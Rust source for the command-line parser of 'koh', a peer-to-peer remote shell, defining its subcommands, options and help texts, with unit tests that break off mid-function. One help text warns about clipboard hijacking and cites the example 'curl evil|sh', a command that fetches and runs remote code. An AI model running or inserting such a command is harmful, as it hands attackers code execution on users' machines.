//! The command line: clap's builder API, and the config structs it produces.
//!
//! Built with the builder API rather than the derive, whose expansions `allow` lints this crate
//! forbids. Help texts are single sentences without a final period, as clap prints them.
//!
//! Endpoint ids and relay URLs are parsed here, by clap, so the configs carry parsed values and an
//! invalid one never gets past the command line.

use std::error::Error as _;
use std::ffi::OsString;
use std::net::SocketAddr;
use std::num::NonZeroU32;
use std::os::unix::ffi::OsStrExt as _;
use std::path::PathBuf;

use clap::error::ErrorKind;
use clap::{value_parser, Arg, ArgAction, ArgMatches, Command};
use iroh::{EndpointId, RelayUrl};

use koh::client::{ConnectConfig, CopyJob, Remote};
use koh::keycmd::{KeyConfig, KeyOp};
use koh::names::{List, Op, Route};
use koh::request::{CommandLine, Pick, RemotePath, SessionNum, Sources};
use koh::server::cli::{
    DEFAULT_MAX_CONNECTIONS, DEFAULT_MAX_SESSIONS, DEFAULT_SCROLLBACK_BYTES,
    DEFAULT_SESSION_TTL_SECS, MAX_SCROLLBACK_BYTES,
};
use koh::server::ServeConfig;
use koh::transport_iroh::{parse_endpoint_id, parse_relay_url};

/// A value clap could not parse, with the message koh reports for it (see [`bad_value`]).
#[derive(Debug)]
pub struct BadValue(String);

impl std::fmt::Display for BadValue {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        f.write_str(&self.0)
    }
}

impl std::error::Error for BadValue {}

/// koh's message for `error` if it is a value one of koh's own parsers refused. koh prints it as it
/// prints every error of its own, `koh: <message>`, rather than in clap's form.
pub fn bad_value(error: &clap::Error) -> Option<&BadValue> {
    error.source()?.downcast_ref()
}

/// A `--allow` endpoint id.
fn allow_id(value: &str) -> Result<EndpointId, BadValue> {
    parse_endpoint_id(value).map_err(|e| BadValue(format!("bad --allow id: {value}: {e}")))
}

/// The server `koh connect` dials: an endpoint id, or the name of one saved in `servers`.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum ServerRef {
    Id(EndpointId),
    Name(String),
}

/// A [`ServerRef`]: an id if it reads as one, else a name if it is one.
fn server_ref(value: &str) -> Result<ServerRef, BadValue> {
    match parse_endpoint_id(value) {
        Ok(id) => Ok(ServerRef::Id(id)),
        Err(_) if koh::names::check_name(value).is_ok() => Ok(ServerRef::Name(value.to_owned())),
        Err(e) => Err(BadValue(format!("parsing server endpoint id: {e}"))),
    }
}

/// A name for `koh servers` or `koh clients`.
fn name(value: &str) -> Result<String, BadValue> {
    koh::names::check_name(value)
        .map(|()| value.to_owned())
        .map_err(|e| BadValue(e.to_string()))
}

/// An endpoint id to save under a name.
fn saved_id(value: &str) -> Result<EndpointId, BadValue> {
    parse_endpoint_id(value).map_err(|e| BadValue(format!("bad endpoint id: {value}: {e}")))
}

/// A `--relay-url`.
fn relay_url(value: &str) -> Result<RelayUrl, BadValue> {
    parse_relay_url(value).map_err(|e| BadValue(e.to_string()))
}

/// What the command line asks for.
#[derive(Debug)]
pub enum Cmd {
    Serve(ServeConfig),
    Connect(ConnectArgs),
    /// `koh sessions`.
    Sessions(RemoteArgs),
    /// `koh exec`.
    Exec {
        remote: RemoteArgs,
        line: CommandLine,
    },
    /// `koh cp`.
    Copy {
        remote: RemoteArgs,
        job: CopyJob,
    },
    Key(KeyConfig),
    /// `koh servers` or `koh clients`.
    Names {
        list: List,
        op: Op,
        key_file: Option<PathBuf>,
    },
    /// `koh` alone: the menu on a terminal, else help.
    Menu,
}

/// The server a command dials and how: a [`Remote`] once its server is known.
#[derive(Debug, Clone)]
pub struct RemoteArgs {
    pub server: ServerRef,
    pub key_file: Option<PathBuf>,
    pub direct: Option<SocketAddr>,
    pub relay_url: Option<RelayUrl>,
}

impl RemoteArgs {
    /// `server`, as these say to dial it, else by its `saved` route.
    pub fn into_remote(self, server: EndpointId, saved: Option<Route>) -> Remote {
        let (direct, relay_url) = match (self.direct, self.relay_url, saved) {
            (None, None, Some(Route::Direct(addr))) => (Some(addr), None),
            (None, None, Some(Route::Relay(url))) => (None, Some(url)),
            (direct, relay_url, _) => (direct, relay_url),
        };
        Remote {
            server,
            key_file: self.key_file,
            direct,
            relay_url,
        }
    }
}

/// `koh connect`'s arguments: a [`ConnectConfig`] once its server is known.
#[derive(Debug, Clone)]
pub struct ConnectArgs {
    pub remote: RemoteArgs,
    pub pick: Pick,
    pub clipboard: bool,
    pub hyperlinks: bool,
    pub colours: bool,
    pub bell_command: Option<String>,
}

impl ConnectArgs {
    /// The config for dialing `server`, by its `saved` route unless told another.
    pub fn into_config(self, server: EndpointId, saved: Option<Route>) -> ConnectConfig {
        ConnectConfig {
            remote: self.remote.into_remote(server, saved),
            pick: self.pick,
            clipboard: self.clipboard,
            hyperlinks: self.hyperlinks,
            colours: self.colours,
            bell_command: self.bell_command,
        }
    }
}

/// `koh`'s command line.
pub fn command() -> Command {
    Command::new("koh")
        .version(env!("CARGO_PKG_VERSION"))
        .about("koh — a resilient peer-to-peer remote shell (mosh over iroh). Run alone on a terminal, it opens a menu of your keys, servers and clients")
        .subcommand(serve())
        .subcommand(connect())
        .subcommand(sessions())
        .subcommand(exec())
        .subcommand(cp())
        .subcommand(id())
        .subcommand(key())
        .subcommand(names(List::Servers))
        .subcommand(names(List::Clients))
}

/// An optional path, `--NAME <VALUE_NAME>`.
fn path(id: &'static str, long: &'static str, value_name: &'static str) -> Arg {
    Arg::new(id)
        .long(long)
        .value_name(value_name)
        .value_parser(value_parser!(PathBuf))
}

/// A flag, `--NAME`.
fn flag(id: &'static str, long: &'static str) -> Arg {
    Arg::new(id).long(long).action(ArgAction::SetTrue)
}

fn serve() -> Command {
    Command::new("serve")
        .about("Host a PTY shell for authorized clients")
        .arg(
            path("key_file", "key-file", "KEY_FILE")
                .help("Path to the persistent secret-key file (gives a stable endpoint id across restarts)"),
        )
        .arg(
            Arg::new("allow")
                .long("allow")
                .value_name("ENDPOINT_ID")
                .value_parser(allow_id)
                .action(ArgAction::Append)
                .help("Authorize a client endpoint id (repeatable), for this run, beside the clients saved with `koh clients add`. At least one client is required — koh only serves peers whose node-id is allowed"),
        )
        .arg(
            Arg::new("shell")
                .long("shell")
                .value_name("PROGRAM_OR_ARG")
                .action(ArgAction::Append)
                .help("Program to run in the session (defaults to $SHELL, else /bin/sh, started as a plain shell, not a login one). Repeat to pass arguments: `--shell zellij --shell attach --shell -c --shell main` runs `zellij attach -c main`. The value is never split on whitespace"),
        )
        .arg(
            flag("no_shell_marks", "no-shell-marks")
                .help("Start bash, zsh or fish as it is, without the shell integration koh adds: by default a session's shell (given no arguments) reads your own startup files, then marks each command (OSC 133), so your terminal knows where each remote command starts and ends, and how"),
        )
        .arg(
            Arg::new("scrollback_bytes")
                .long("scrollback-bytes")
                .value_name("BYTES")
                .default_value(DEFAULT_SCROLLBACK_BYTES.to_string())
                .value_parser(value_parser!(u64).range(0..=MAX_SCROLLBACK_BYTES))
                .help("Bytes of scrollback each session's server-side emulator keeps (8 MiB holds about 20,000 lines of 50 characters); past it, the oldest lines go. At most 1 GiB; 0 = no scrollback"),
        )
        .arg(
            Arg::new("session_ttl_secs")
                .long("session-ttl-secs")
                .value_name("SESSION_TTL_SECS")
                .default_value(DEFAULT_SESSION_TTL_SECS.to_string())
                .value_parser(value_parser!(u64))
                .help("Keep a detached session's shell alive this long (seconds) for the client to reconnect. Default 24h (mosh-style \"close the laptop, reopen later\")"),
        )
        .arg(
            Arg::new("relay_url")
                .long("relay-url")
                .value_name("URL")
                .value_parser(relay_url)
                .help("Host via a self-hosted relay URL instead of n0's public relays"),
        )
        .arg(
            flag("local", "local")
                .conflicts_with("relay_url")
                .help("Bind without any relay/discovery (LAN / loopback). Clients dial with --direct <ip:port>"),
        )
        .arg(
            Arg::new("port")
                .long("port")
                .value_name("PORT")
                .value_parser(value_parser!(u16).range(1..))
                .help("Bind this UDP port (IPv4 and IPv6) instead of an ephemeral one, so clients dialing --direct <ip:port> find the server again after a restart"),
        )
        .arg(
            Arg::new("max_connections")
                .long("max-connections")
                .value_name("MAX_CONNECTIONS")
                .default_value(DEFAULT_MAX_CONNECTIONS.to_string())
                .value_parser(value_parser!(NonZeroU32))
                .help("Maximum number of connections handled at once (each holds a permit for its whole life; past them a new one is closed as at capacity once its handshake is done). Handshakes under way are capped apart, so stalled ones never take these"),
        )
        .arg(
            Arg::new("max_sessions")
                .long("max-sessions")
                .value_name("MAX_SESSIONS")
                .default_value(DEFAULT_MAX_SESSIONS.to_string())
                .value_parser(value_parser!(NonZeroU32))
                .help("Maximum number of live sessions, all clients' together. A new session is refused once this many exist; reattaching to one is always allowed. Bounds the number of real shells a flood of authorized keys can spawn"),
        )
}

/// `cmd` with how to dial the server: the client key, `--direct` and `--relay-url`.
fn dialing(cmd: Command) -> Command {
    cmd.arg(
        path("key_file", "key-file", "KEY_FILE")
            .help("Path to the client's persistent secret key (its endpoint id must be on the server's allowlist)"),
    )
    .arg(
        Arg::new("direct")
            .long("direct")
            .value_name("IP:PORT")
            .value_parser(value_parser!(SocketAddr))
            .conflicts_with("relay_url")
            .help("Dial the server at a direct socket address (LAN / loopback; no relay or discovery)"),
    )
    .arg(
        Arg::new("relay_url")
            .long("relay-url")
            .value_name("URL")
            .value_parser(relay_url)
            .help("Dial the server via a self-hosted relay URL instead of n0's public relays"),
    )
}

/// `cmd` with its server, `SERVER`, and how to dial it.
fn remote(cmd: Command) -> Command {
    dialing(
        cmd.arg(
            Arg::new("server")
                .value_name("SERVER")
                .value_parser(server_ref)
                .required(true)
                .help("The server: a name saved with `koh servers add`, or its endpoint id"),
        ),
    )
}

fn connect() -> Command {
    remote(Command::new("connect").about("Connect to a koh server by its name or endpoint id: to your session there you attached to last, or a new one if you have none"))
        .arg(
            flag("new", "new")
                .conflicts_with("session")
                .help("Start a new session, beside any you have"),
        )
        .arg(
            Arg::new("session")
                .long("session")
                .value_name("N")
                .value_parser(value_parser!(u64))
                .help("Attach to your session numbered N (`koh sessions` lists them)"),
        )
        .arg(
            flag("no_clipboard", "no-clipboard")
                .help("Ignore the remote app's OSC-52 clipboard writes. By default they set your system clipboard (base64 only, at most 16 KiB, never read back), so a remote app's \"copy\" works; but a malicious or compromised server can then replace what you copied (a command for `curl evil|sh`, say). Use this when you do not trust the server"),
        )
        .arg(
            flag("no_hyperlinks", "no-hyperlinks")
                .help("Paint the remote app's hyperlinks (OSC 8) as plain text. By default they are painted as links your terminal can open, each checked first: printable ASCII only, within fux-vt's limits"),
        )
        .arg(
            flag("no_colours", "no-colours")
                .help("Do not tell the server your terminal's colours. By default koh asks your terminal its foreground, background, palette entries 0 to 15 and dark or light scheme, and the server answers remote programs that ask (vim, bat, delta pick their theme so); that tells the server your theme, a small fingerprint"),
        )
        .arg(
            Arg::new("on_bell")
                .long("on-bell")
                .value_name("CMD")
                .help("Run this shell command whenever the remote bell rings (e.g. on Termux: `--on-bell 'termux-notification -t \"koh bell\"'`). Detached from the terminal; at most one spawn per second. KOH_BELL_COUNT and KOH_TITLE are set in its environment. Bells that rang before you attached do not fire it; bells during a reconnect do"),
        )
}

fn sessions() -> Command {
    remote(Command::new("sessions").about(
        "List your sessions on a server, one a line: its number, attached or detached (and for how long), its age, size, whether its program runs or exited (and its status), and its title",
    ))
}

fn exec() -> Command {
    remote(Command::new("exec").about(
        "Run a command on a server with no terminal, as ssh does, and exit with its status: the words joined with spaces and run by the server user's shell (`$SHELL -c`) in their home. Your stdin goes to it, its stdout and stderr come back apart; a signal or losing the link hangs it up. Exits 255 on koh's own errors",
    ))
    .arg(
        Arg::new("command")
            .value_name("COMMAND")
            .value_parser(value_parser!(OsString))
            .num_args(1..)
            .trailing_var_arg(true)
            .allow_hyphen_values(true)
            .required(true)
            .help("The command and its arguments (after `--` if it starts with one)"),
    )
}

fn cp() -> Command {
    dialing(Command::new("cp").about(
        "Copy files and whole directories between this machine and a server: `koh cp SRC... SERVER:PATH`, or `koh cp SERVER:PATH... DST`. A remote path is the server user's shell's: `~`, `~/x` and relative paths are in their home. Into DST if it is a directory, else as DST (one SRC). Modes, times, odd names and symlinks are kept; nothing lands until all of it has, and a directory is never merged into one already there",
    ))
    .arg(
        Arg::new("paths")
            .value_name("PATH")
            .value_parser(value_parser!(OsString))
            .num_args(2..)
            .required(true)
            .help("The sources, then the destination; exactly one side is SERVER:PATH (a saved name or an endpoint id, before the first `:`; a path with a `/` before its `:` is local, as `./a:b`)"),
    )
    .arg(flag("recursive", "recursive").short('r').visible_short_alias('R').help("Accepted, as scp's: directories always copy whole"))
    .arg(flag("preserve", "preserve").short('p').help("Accepted, as scp's: modes and modification times are always kept"))
}

fn id() -> Command {
    Command::new("id")
        .about("Print this machine's koh id (add it to a server's --allow list)")
        .arg(
            path("key_file", "key-file", "KEY_FILE")
                .help("Path to the client's persistent secret key"),
        )
}

fn key() -> Command {
    Command::new("key")
        .about("Show or reset this machine's identity key")
        .subcommand_required(true)
        .arg_required_else_help(true)
        .arg(
            path("key_file", "key-file", "KEY_FILE")
                .global(true)
                // After the subcommand's own options, where the derive listed it.
                .display_order(1)
                .help("Which identity key to operate on. Defaults to the client key path (as `koh id` uses); pass a server key explicitly to manage it"),
        )
        .subcommand(
            Command::new("info")
                .about("Print the key files and their endpoint ids (never the secret): both keys, or the one named")
                .arg(role()),
        )
        .subcommand(
            Command::new("reset")
                .about("Delete an unused identity; the next use creates a new endpoint ID")
                .arg(role())
                .arg(flag("yes", "yes").help("Acknowledge permanent identity loss and required allowlist updates")),
        )
}

/// Which key, `client` (the default) or `server`.
fn role() -> Arg {
    Arg::new("role")
        .value_name("KEY")
        .value_parser(["client", "server"])
        .conflicts_with("key_file")
        .help("Which key: client (as `koh id` and `koh connect` use; the default) or server (as `koh serve` uses)")
}

/// `koh servers` or `koh clients`.
fn names(list: List) -> Command {
    let (about, key) = match list {
        List::Servers => (
            "List, add, remove or rename the servers this machine connects to, by name",
            "client",
        ),
        List::Clients => (
            "List, add, remove or rename the clients allowed to connect to this machine",
            "server",
        ),
    };
    let mut add = Command::new("add")
        .about(format!("Save a {} under a name", list.noun()))
        .arg(name_arg("name", "NAME"))
        .arg(
            Arg::new("id")
                .value_name("ENDPOINT_ID")
                .value_parser(saved_id)
                .required(true),
        );
    if list == List::Servers {
        add = add
            .arg(
                Arg::new("direct")
                    .long("direct")
                    .value_name("IP:PORT")
                    .value_parser(value_parser!(SocketAddr))
                    .conflicts_with("relay_url")
                    .help("Dial it at this direct socket address (LAN / loopback) unless a command says --direct or --relay-url itself"),
            )
            .arg(
                Arg::new("relay_url")
                    .long("relay-url")
                    .value_name("URL")
                    .value_parser(relay_url)
                    .help("Dial it via this self-hosted relay unless a command says --direct or --relay-url itself"),
            );
    }
    Command::new(list.file())
        .about(about)
        .arg(
            path("key_file", "key-file", "KEY_FILE")
                .global(true)
                .display_order(1)
                .help(format!(
                    "The {key} key whose directory holds the list (defaults to the {key} key path)"
                )),
        )
        .subcommand(add)
        .subcommand(
            Command::new("rm")
                .about(format!("Forget a {}", list.noun()))
                .arg(name_arg("name", "NAME")),
        )
        .subcommand(
            Command::new("rename")
                .about(format!("Rename a {}", list.noun()))
                .arg(name_arg("old", "OLD"))
                .arg(name_arg("new", "NEW")),
        )
}

/// A required name, `<VALUE_NAME>`.
fn name_arg(id: &'static str, value_name: &'static str) -> Arg {
    Arg::new(id)
        .value_name(value_name)
        .value_parser(name)
        .required(true)
}

/// The config `matches` asks for. clap has already enforced the required subcommands and
/// arguments, the defaults and the ranges, so a missing value is an internal error.
pub fn parse(matches: &ArgMatches) -> Result<Cmd, clap::Error> {
    match matches.subcommand() {
        Some(("serve", m)) => Ok(Cmd::Serve(ServeConfig {
            key_file: m.get_one::<PathBuf>("key_file").cloned(),
            allow: m
                .get_many::<EndpointId>("allow")
                .map_or_else(Vec::new, |ids| ids.copied().collect()),
            saved_clients: None,
            command: strings(m, "shell"),
            scrollback_bytes: value(m, "scrollback_bytes")?,
            session_ttl_secs: value(m, "session_ttl_secs")?,
            relay_url: m.get_one::<RelayUrl>("relay_url").cloned(),
            local: m.get_flag("local"),
            port: m.get_one::<u16>("port").copied(),
            max_connections: value(m, "max_connections")?,
            max_sessions: value(m, "max_sessions")?,
            home: koh::pty::Home::user(),
            shell_marks: !m.get_flag("no_shell_marks"),
        })),
        Some(("connect", m)) => Ok(Cmd::Connect(ConnectArgs {
            remote: remote_args(m)?,
            pick: match m.get_one::<u64>("session") {
                Some(&n) => Pick::Id(SessionNum(n)),
                None if m.get_flag("new") => Pick::New,
                None => Pick::Latest,
            },
            clipboard: !m.get_flag("no_clipboard"),
            hyperlinks: !m.get_flag("no_hyperlinks"),
            colours: !m.get_flag("no_colours"),
            bell_command: m.get_one::<String>("on_bell").cloned(),
        })),
        Some(("sessions", m)) => Ok(Cmd::Sessions(remote_args(m)?)),
        Some(("exec", m)) => {
            let words: Vec<&[u8]> = m
                .get_many::<OsString>("command")
                .into_iter()
                .flatten()
                .map(|word| word.as_bytes())
                .collect();
            let line =
                CommandLine::join(&words).map_err(|why| invalid(&format!("the command: {why}")))?;
            Ok(Cmd::Exec {
                remote: remote_args(m)?,
                line,
            })
        }
        Some(("cp", m)) => {
            let paths: Vec<&OsString> = m
                .get_many::<OsString>("paths")
                .into_iter()
                .flatten()
                .collect();
            let (server, job) = copy_job(&paths)?;
            Ok(Cmd::Copy {
                remote: RemoteArgs {
                    server,
                    key_file: m.get_one::<PathBuf>("key_file").cloned(),
                    direct: m.get_one::<SocketAddr>("direct").copied(),
                    relay_url: m.get_one::<RelayUrl>("relay_url").cloned(),
                },
                job,
            })
        }
        Some(("id", m)) => Ok(Cmd::Key(KeyConfig {
            op: KeyOp::Id,
            role: "client",
            key_file: m.get_one::<PathBuf>("key_file").cloned(),
            role_named: false,
        })),
        Some(("key", m)) => {
            let (op, sub) = match m.subcommand() {
                Some(("info", sub)) => (KeyOp::Info, sub),
                Some(("reset", sub)) => (
                    KeyOp::Reset {
                        confirmed: sub.get_flag("yes"),
                    },
                    sub,
                ),
                _ => return Err(missing("key subcommand")),
            };
            let key_file = global_key_file(m, sub);
            let named = sub.get_one::<String>("role");
            let role = if named.is_some_and(|r| r == "server") {
                "server"
            } else {
                "client"
            };
            Ok(Cmd::Key(KeyConfig {
                op,
                role,
                key_file,
                role_named: named.is_some(),
            }))
        }
        Some((list @ ("servers" | "clients"), m)) => {
            let list = if list == "servers" {
                List::Servers
            } else {
                List::Clients
            };
            let one = |sub: &ArgMatches, id: &str| {
                sub.get_one::<String>(id)
                    .cloned()
                    .ok_or_else(|| missing(id))
            };
            let (op, sub) = match m.subcommand() {
                None => (Op::List, m),
                Some(("add", sub)) => (
                    Op::Add {
                        name: one(sub, "name")?,
                        id: sub
                            .get_one::<EndpointId>("id")
                            .copied()
                            .ok_or_else(|| missing("id"))?,
                        route: saved_route(sub),
                    },
                    sub,
                ),
                Some(("rm", sub)) => (
                    Op::Remove {
                        name: one(sub, "name")?,
                    },
                    sub,
                ),
                Some(("rename", sub)) => (
                    Op::Rename {
                        old: one(sub, "old")?,
                        new: one(sub, "new")?,
                    },
                    sub,
                ),
                Some(_) => return Err(missing("servers or clients subcommand")),
            };
            let key_file = global_key_file(m, sub);
            Ok(Cmd::Names { list, op, key_file })
        }
        None => Ok(Cmd::Menu),
        Some(_) => Err(missing("subcommand")),
    }
}

/// The route `koh servers add` was given, if any: `koh clients add` takes none.
fn saved_route(m: &ArgMatches) -> Option<Route> {
    let direct = m.try_get_one::<SocketAddr>("direct").ok().flatten();
    let relay = || m.try_get_one::<RelayUrl>("relay_url").ok().flatten();
    direct
        .copied()
        .map(Route::Direct)
        .or_else(|| relay().cloned().map(Route::Relay))
}

/// The server and how to dial it, as `m` says.
fn remote_args(m: &ArgMatches) -> Result<RemoteArgs, clap::Error> {
    Ok(RemoteArgs {
        server: m
            .get_one::<ServerRef>("server")
            .cloned()
            .ok_or_else(|| missing("server"))?,
        key_file: m.get_one::<PathBuf>("key_file").cloned(),
        direct: m.get_one::<SocketAddr>("direct").copied(),
        relay_url: m.get_one::<RelayUrl>("relay_url").cloned(),
    })
}

/// A path `koh cp` was given: here, or on a server.
#[derive(Debug, Clone, PartialEq, Eq)]
enum Location {
    Local(PathBuf),
    Remote(ServerRef, RemotePath),
}

impl Location {
    /// `arg` as scp reads it: `SERVER:PATH` if there is a `:` with no `/` before it and what is
    /// before it names a server; else a local path.
    fn of(arg: &OsString) -> Result<Self, clap::Error> {
        let bytes = arg.as_bytes();
        let split = bytes.iter().position(|&b| b == b':').and_then(|at| {
            let (server, path) = (bytes.get(..at)?, bytes.get(at.saturating_add(1)..)?);
            let server = std::str::from_utf8(server)
                .ok()
                .filter(|s| !s.is_empty() && !s.contains('/'))?;
            Some((server_ref(server).ok()?, path))
        });
        match split {
            Some((server, path)) => RemotePath::new(path.to_vec())
                .map(|path| Self::Remote(server, path))
                .map_err(|why| invalid(&format!("{}: {why}", arg.to_string_lossy()))),
            None => Ok(Self::Local(PathBuf::from(arg))),
        }
    }
}

/// The copy `paths` (the sources, then the destination) ask for, and its server: exactly one side
/// is the server's.
fn copy_job(paths: &[&OsString]) -> Result<(ServerRef, CopyJob), clap::Error> {
    let mut locations = paths
        .iter()
        .map(|arg| Location::of(arg))
        .collect::<Result<Vec<_>, _>>()?;
    let Some(dest) = locations.pop() else {
        return Err(missing("destination"));
    };
    let one_side =
        || invalid("copy between this machine and one server: every SRC is SERVER:PATH, or DST is");
    match dest {
        Location::Remote(server, dest) => {
            let sources = locations
                .into_iter()
                .map(|source| match source {
                    Location::Local(path) => Ok(path),
                    Location::Remote(..) => Err(one_side()),
                })
                .collect::<Result<Vec<_>, _>>()?;
            Ok((server, CopyJob::Put { sources, dest }))
        }
        Location::Local(dest) => {
            let mut server = None;
            let mut sources = Vec::with_capacity(locations.len());
            for source in locations {
                let Location::Remote(from, path) = source else {
                    return Err(one_side());
                };
                if server.get_or_insert_with(|| from.clone()) != &from {
                    return Err(invalid("copy from one server at a time"));
                }
                sources.push(path);
            }
            let server = server.ok_or_else(one_side)?;
            let sources =
                Sources::new(sources).map_err(|why| invalid(&format!("the sources: {why}")))?;
            Ok((server, CopyJob::Get { sources, dest }))
        }
    }
}

/// A usage error koh found in what clap took.
fn invalid(why: &str) -> clap::Error {
    clap::Error::raw(ErrorKind::ValueValidation, format!("{why}\n"))
}

/// A `--key-file` global to `m`: clap stores it with the subcommand given, `sub`.
fn global_key_file(m: &ArgMatches, sub: &ArgMatches) -> Option<PathBuf> {
    (sub.get_one::<PathBuf>("key_file"))
        .or_else(|| m.get_one::<PathBuf>("key_file"))
        .cloned()
}

/// Every value of a repeatable argument, in order.
fn strings(m: &ArgMatches, id: &str) -> Vec<String> {
    m.get_many::<String>(id)
        .map_or_else(Vec::new, |values| values.cloned().collect())
}

/// An argument that has a default, so always a value.
fn value<T: Clone + Send + Sync + 'static>(m: &ArgMatches, id: &str) -> Result<T, clap::Error> {
    m.get_one::<T>(id).cloned().ok_or_else(|| missing(id))
}

fn missing(what: &str) -> clap::Error {
    clap::Error::raw(
        ErrorKind::MissingRequiredArgument,
        format!("internal error: no {what} after parsing\n"),
    )
}

#[cfg(test)]
mod tests {
    use super::{bad_value, command, parse, Cmd};
    use clap::error::ErrorKind;
    use koh::keycmd::KeyOp;
    use koh::server::ServeConfig;

    /// A valid endpoint id.
    const ID: &str = "d12841817cf7b0e8b357ae293f8a0c7d911d9661b06833a8365a1b3e7f83febf";

    fn parsed(argv: &[&str]) -> Cmd {
        let matches = command()
            .try_get_matches_from(argv)
            .expect("valid command line");
        parse(&matches).expect("parsed")
    }

    #[test]
    fn the_command_line_is_consistent() {
        command().debug_assert();
    }

    #[test]
    fn serve_args_map_shell_to_command_argv_and_keep_defaults() {
        let Cmd::Serve(c) = parsed(&[
            "koh", "serve", "--allow", ID, "--shell", "zellij", "--shell", "attach",
        ]) else {
            panic!("serve");
        };
        assert_eq!(c.command, ["zellij", "attach"]);
        assert_eq!(c.allow, [ID.parse().unwrap()]);
        // Everything not given on the command line must equal `ServeConfig::default()`.
        let d = ServeConfig::default();
        assert_eq!(c.scrollback_bytes, d.scrollback_bytes);
        assert_eq!(c.session_ttl_secs, d.session_ttl_secs);
        assert_eq!(c.max_connections, d.max_connections);
        assert_eq!(c.max_sessions, d.max_sessions);
        assert!(!c.local && c.relay_url.is_none() && c.key_file.is_none());
        assert_eq!(c.port, d.port);
        assert!(c.shell_marks && d.shell_marks);
        let Cmd::Serve(c) = parsed(&["koh", "serve", "--allow", ID, "--no-shell-marks"]) else {
            panic!("serve");
        };
        assert!(!c.shell_marks);

        // A single `--shell` is just the program.
        let Cmd::Serve(c) = parsed(&["koh", "serve", "--allow", ID, "--shell", "/bin/zsh"]) else {
            panic!("serve");
        };
        assert_eq!(c.command, ["/bin/zsh"]);
        // No `--shell` = `$SHELL`.
        let Cmd::Serve(c) = parsed(&["koh", "serve", "--allow", ID]) else {
            panic!("serve");
        };
        assert_eq!(c.command, Vec::<String>::new());
    }

    #[test]
    fn serve_port_is_a_nonzero_udp_port() {
        let Cmd::Serve(c) = parsed(&["koh", "serve", "--allow", ID, "--local", "--port", "4433"])
        else {
            panic!("serve");
        };
        assert_eq!(c.port, Some(4433));
        assert!(c.local);
        for port in ["0", "65536", "http"] {
            let error = command()
                .try_get_matches_from(["koh", "serve", "--allow", ID, "--port", port])
                .expect_err("an invalid port");
            assert_eq!(error.kind(), ErrorKind::ValueValidation, "{port}");
        }
    }

    /// `koh connect`'s server is a saved name or an id; clipboard writes, hyperlinks and colours
    /// are on unless turned off, as in `ConnectConfig`'s default.
    #[test]
    fn connect_takes_a_server_a_bell_command_and_turns_features_off() {
        use koh::request::{Pick, SessionNum};
        let connect = |argv: &[&str]| {
            let Cmd::Connect(c) = parsed(&[&["koh", "connect"][..], argv].concat()) else {
                panic!("connect {argv:?}");
            };
            c
        };
        let c = connect(&[ID, "--on-bell", "termux-notification"]);
        assert_eq!(c.remote.server, super::ServerRef::Id(ID.parse().unwrap()));
        assert_eq!(c.bell_command.as_deref(), Some("termux-notification"));
        assert!(c.clipboard && c.hyperlinks && c.colours && c.remote.direct.is_none());
        assert_eq!(c.pick, Pick::Latest);
        let d = koh::client::ConnectConfig::new(ID.parse().unwrap());
        assert!(d.clipboard && d.hyperlinks && d.colours && d.bell_command.is_none());
        let c = connect(&["laptop"]);
        assert_eq!(c.remote.server, super::ServerRef::Name("laptop".to_owned()));
        assert_eq!(connect(&["laptop", "--new"]).pick, Pick::New);
        assert_eq!(
            connect(&["laptop", "--session", "4"]).pick,
            Pick::Id(SessionNum(4))
        );
        assert!(command()
            .try_get_matches_from(["koh", "connect", "laptop", "--new", "--session", "4"])
            .is_err());
        for (flag, on) in [
            ("--no-clipboard", [false, true, true]),
            ("--no-hyperlinks", [true, false, true]),
            ("--no-colours", [true, true, false]),
        ] {
            let c = connect(&[ID, flag]);
            assert_eq!([c.clipboard, c.hyperlinks, c.colours], on, "{flag}");
        }
        // The old opt-in is gone, so a script that passed it hears of it.
        assert!(command()
            .try_get_matches_from(["koh", "connect", ID, "--clipboard"])
            .is_err());
    }

    #[test]
    fn ids_and_relay_urls_are_parsed_on_the_command_line() {
        let Cmd::Serve(c) = parsed(&[
            "koh",
            "serve",
            "--allow",
            ID,
            "--relay-url",
            "https://relay.example",
        ]) else {
            panic!("serve");
        };
        assert_eq!(c.relay_url, Some("https://relay.example".parse().unwrap()));
        // An invalid value is refused while parsing the command line, with the message koh gave
        // when it parsed the value later.
        let invalid = "could not parse endpoint id: invalid length";
        for (argv, message) in [
            (
                &["koh", "serve", "--allow", "bad"][..],
                format!("bad --allow id: bad: {invalid}"),
            ),
            (
                &["koh", "serve", "--allow", ID, "--allow", "bad2"][..],
                format!("bad --allow id: bad2: {invalid}"),
            ),
            (
                &["koh", "connect", "not/a-name"][..],
                format!("parsing server endpoint id: {invalid}"),
            ),
            (
                &["koh", "serve", "--allow", ID, "--relay-url", "bad"][..],
                "bad relay url: Failed to parse relay URL".to_owned(),
            ),
            (
                &["koh", "connect", ID, "--relay-url", "bad"][..],
                "bad relay url: Failed to parse relay URL".to_owned(),
            ),
        ] {
            let error = command()
                .try_get_matches_from(argv)
                .expect_err("an invalid value");
            assert_eq!(error.kind(), ErrorKind::ValueValidation, "{argv:?}");
            assert_eq!(
                bad_value(&error).map(ToString::to_string),
                Some(message),
                "{argv:?}"
            );
        }
    }

    #[test]
    fn servers_and_clients_take_add_rm_and_rename() {
        use koh::names::{List, Op};
        let Cmd::Names { list, op, key_file } = parsed(&["koh", "servers"]) else {
            panic!("servers");
        };
        assert_eq!((list, op, key_file), (List::Servers, Op::List, None));
        let Cmd::Names { list, op, key_file } =
            parsed(&["koh", "clients", "add", "phone", ID, "--key-file", "/k"])
        else {
            panic!("clients add");
        };
        assert_eq!(list, List::Clients);
        assert_eq!(
            op,
            Op::Add {
                name: "phone".to_owned(),
                id: ID.parse().unwrap(),
                route: None,
            }
        );
        assert_eq!(key_file.as_deref(), Some(std::path::Path::new("/k")));
        // A server is saved with how to dial it; a client, never dialed, has no such flag.
        let Cmd::Names { op, .. } = parsed(&[
            "koh",
            "servers",
            "add",
            "box",
            ID,
            "--direct",
            "10.0.0.2:4433",
        ]) else {
            panic!("servers add --direct");
        };
        assert!(
            matches!(op, Op::Add { route: Some(koh::names::Route::Direct(addr)), .. } if addr.port() == 4433),
            "{op:?}"
        );
        for argv in [
            &[
                "koh",
                "clients",
                "add",
                "phone",
                ID,
                "--direct",
                "10.0.0.2:4433",
            ][..],
            &[
                "koh",
                "servers",
                "add",
                "box",
                ID,
                "--direct",
                "10.0.0.2:4433",
                "--relay-url",
                "https://relay.example",
            ],
        ] {
            assert!(command().try_get_matches_from(argv).is_err(), "{argv:?}");
        }
